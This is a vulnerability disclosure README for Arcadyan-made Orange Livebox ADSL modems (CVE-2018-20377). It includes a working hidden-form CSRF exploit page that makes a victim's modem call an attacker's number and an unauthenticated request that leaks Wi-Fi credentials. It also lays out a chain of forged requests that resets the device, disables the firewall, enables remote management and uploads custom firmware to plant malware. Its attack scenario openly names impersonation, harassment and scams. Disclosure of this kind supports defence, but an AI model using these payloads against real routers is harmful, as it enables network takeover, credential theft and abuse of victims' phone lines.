# LIVEBOX-0DAY   CVE-2018-20377
Arcadyan ARV7519RW22-A-L T VR9 1.2 Multiple security vulnerabilities affecting latest firmware release on ORANGE Livebox ADSL modems.

```
Versión de Firmware:  00.96.320S (01.11.2017-11:43:44)
Versión del Boot:  v0.70.03
Versión del Módem ADSL: 5.4.1.10.1.1A
Versión de Hardware:  02
```


**CWE-359**: *Exposure of Private Information ('Privacy Violation').*

A very serious attack vector allows an attacker to link CSRF drive-by vulnerabilities to exploit Autodialing and Line Test features, succesfully making calls from a victim's line, exposing a client's phone number and making him susceptible to scams and impersonation. Nuisance calls alone are also a serious concern.

` Proof of concept exploit: `  

``` html
<!DOCTYPE html>

<!-- Phone number disclosure, reflected call exploit -->

<html>

<iframe style="display:none" id="csrf-frame-invisible" name="csrf-frame-invisible"></iframe>
<form style="display:none" method='POST' action='http://192.168.1.1/cgi-bin/autodialing.exe' target="csrf-frame-invisible" name="csrf-form-invisible" id="csrf-form-invisible">
  <input type='hidden' name='autodialing_enable' value='1'>
  <input type='hidden' name='autodialing_number' value='5550150'> <!-- attacker's phone number goes here -->
  <input type='hidden' name='autodialing_timeout' value='0'>
  <input type='submit' value='Submit'>
</form>

<script>document.getElementById("csrf-form-invisible").submit()</script>

<img src="http://192.168.1.1/cgi-bin/phone_test.exe" width="0" height="0" border="0">

</html>
```

When the victim visits the malicious site, it will create an autodialing profile on the victim's modem, and activate the Line Test feature. No interaction needed. The phone will ring, and when the call is answered the autodialing feature will call the attacker's number. 

&nbsp;

<!---
-->
 Demo                           | Attack scenario |
:------------------------------:|:----------------------:|
 ![DEMO](poc/CWE-359.gif)       | This vector can be exploited to conduct false flag operations (such as impersonating an individual with a restraint order against another), marketing campaings, harassment, denial of service, and intelligence gathering. |

&nbsp;



**CWE-200**: *Information Exposure: Unauthenticated configuration information leak.*

	The webserver leaks access point security protocol, SSID, and password in plain text.
	GET http://192.168.1.1/get_getnetworkconf.cgi

``` html
	<html>
	<body>
	Orange-SSID<BR>
	PASSWORD<BR>
	255.255.255.0<BR>
	192.168.1.1<BR>
	0<BR>
	WPA<BR>
	<BR>
	</body>
	</html>
```


**CWE-352**: *Cross-Site Request Forgery (CSRF): The web application does not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request. Allows an attacker to manipulate all configuration parameters.*

```
Integrity Impact 	Complete. 	(There is a total compromise of system integrity. There is a complete loss of system protection, resulting in the entire system being compromised.)  
Availability Impact 	Complete.	(There is a total shutdown of the affected resource. The attacker can render the resource completely unavailable.)  
Access Complexity 	Low.		(Specialized access conditions or extenuating circumstances do not exist. Very little knowledge or skill is required to exploit. )  
Authentication 		None.		(The vulnerability does not require an attacker or user to be logged into the system).   
User interaction        None.  
```

	- Login with default admin:admin credentials after restoring configuration to factory settings. (This can be omited if the victim has an active session.)
	- Change default credentials.
	- Enable remote access.
	- Upload custom firmware to install remote access malware or brick the system.

	
	POST http://192.168.1.1/cgi-bin/restore.exe {empty body} Restores configuration to factory defaults.
	POST http://192.168.1.1/cgi-bin/firewall_SPI.exe {empty body} Disables all firewall protections.
	POST http://192.168.1.1/cgi-bin/setup_remote_mgmt.exe {IP1=FIRST_OCTET &IP2=SECOND_OCTET &IP3=THIRD_OCTET &IP4=FOURTH_OCTET &r_mgnt_port=_PORT } Allows remote administration. 
	POST http://192.168.1.1/cgi-bin/setup_pass.exe	{submit_action=0&userNew=admin&userOldPswd=admin&userNewPswd=NEWPASS&userConPswd=NEWPASS&timeout=0} Changes default password.
	POST http://192.168.1.1/cgi-bin/upgradep.exe Custom firmware update.




**CWE-912**: *Hidden Functionality. The software contains functionality that is not documented, not part of the specification, and not accessible through an interface or command sequence that is obvious to the software's users or administrators.*

Manual firmware update. Allows malware to be installed as described before.
	
	GET http://192.168.1.1/system_firmwarel.stm

## Media coverage

* [BadPackets](https://badpackets.net/over-19000-orange-livebox-adsl-modems-are-leaking-their-wifi-credentials/)
* [InfoSecurity Magazine](https://www.infosecurity-magazine.com/news/20000-orange-modems-leaking-wi-fi/)  
* [BleepingComputer](https://www.bleepingcomputer.com/news/security/orange-livebox-modems-targeted-for-ssid-and-wifi-info/)    
* [GBhackers](https://gbhackers.com/orange-adsl-modems/)    

---

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details

**mapez** - [telegram](https://t.me/mapezz)
